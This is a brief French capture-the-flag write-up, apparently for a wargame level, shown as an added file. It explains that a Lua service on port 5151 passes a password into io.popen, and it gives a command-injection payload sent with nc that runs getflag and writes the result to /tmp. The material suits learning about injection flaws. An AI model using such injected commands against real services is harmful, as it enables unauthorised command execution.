@@ -1,0 +1,9 @@
+il y a un msg d'erreur et un fichier lua
+
+dans ce fichier lua on voit qu'il y a une interaction avec le 5151
+ce process tourne et grace a la fonction `io.popen("echo "..pass.." | sha1sum", "r")` on peut injecter du code
+sur le model `echo " ... "` puis en interrogeant le port concerné:
+
+-> echo " ; getflag > /tmp/flag ; echo 123" | nc localhost 5151 ; cat /tmp/flag
+
+su level12
